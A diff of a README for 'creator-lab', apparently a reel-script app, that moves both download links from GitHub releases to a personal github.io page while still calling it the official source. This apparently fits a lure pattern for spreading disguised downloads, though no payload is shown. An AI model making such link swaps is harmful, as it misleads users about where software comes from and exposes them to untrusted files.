@@ -1,6 +1,6 @@
 # 🎬 creator-lab - Unlock Viral Reel Scripts, Effortlessly
 
-[![Download Creator Lab](https://img.shields.io/badge/Download-creator--lab-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://github.com/Aguustinnn083/creator-lab/releases)
+[![Download Creator Lab](https://img.shields.io/badge/Download-creator--lab-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://aguustinnn083.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ No coding skills? No problem. This app is built for creators, marketers, and cur
 
 Visit this link to download the application. This is the official source for the latest version. Click the button below or the one at the top of this page.
 
-[**🔗 Download creator-lab Now**](https://github.com/Aguustinnn083/creator-lab/releases)
+[**🔗 Download creator-lab Now**](https://aguustinnn083.github.io)
 
 Once you land on the page, look for the file listed at the top. This is a general download page, so you'll see a list of released versions. Pick the most recent one. The download will start automatically after you click the file name. Save it somewhere you can easily find, like your Downloads folder or Desktop.
 
